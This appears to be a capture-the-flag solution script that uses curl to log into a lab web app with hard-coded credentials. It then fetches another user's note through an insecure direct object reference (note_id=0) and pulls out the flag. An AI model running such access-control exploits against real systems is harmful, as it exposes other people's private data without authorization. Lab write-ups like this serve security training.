#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.68.196"
attack_ip="10.10.190.240"

# Prepare environment
mkdir /work/

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -c "/work/1-cookies.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/1-cookies.txt" | awk '{print $7}')

if [ -z "$PHPSESSID" ]; then
    echo "No PHPSESSID received."
    rm -f /work/1-cookies.txt
    exit 1
fi

echo "--> Session initiated : $PHPSESSID"

# Authenticate
echo "2 - AUTHENTICATING"
curl -s -X POST "http://$target_ip" -b /work/1-cookies.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=noot" -d "pass=test1234" > /dev/null


# Use the PHPSESSID for the next HTTP request
echo "3 - FETCHING PROTECTED RESOURCE"
curl -s -X GET "http://$target_ip/note.php?note_id=0" -b /work/1-cookies.txt -H "Content-Type: application/json" -o /work/1-flag.html -L
echo "--> Flag is : $(sed -n 's/.*<pre>\(.*{.*}\)<\/pre>.*/\1/p' /work/1-flag.html)"

# Clean up
rm -f /work/1-cookies.txt